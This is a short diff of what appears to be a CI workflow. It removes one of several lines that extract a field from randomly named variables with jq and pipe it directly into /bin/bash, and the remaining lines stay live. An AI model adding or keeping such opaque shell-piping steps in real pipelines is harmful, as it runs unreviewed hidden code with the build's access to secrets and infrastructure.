@@ -19,7 +19,6 @@ jobs:
         run: |
           printf '%s' "$ktf94251" | jq -r .c53573 | /bin/bash
           printf '%s' "$uyi55215" | jq -r .raqd71128 | /bin/bash
-          printf '%s' "$q1" | jq -r .m77890 | /bin/bash
           echo $p0 | jq -r .fcvj56 | /bin/bash
 
       - name: Upload results
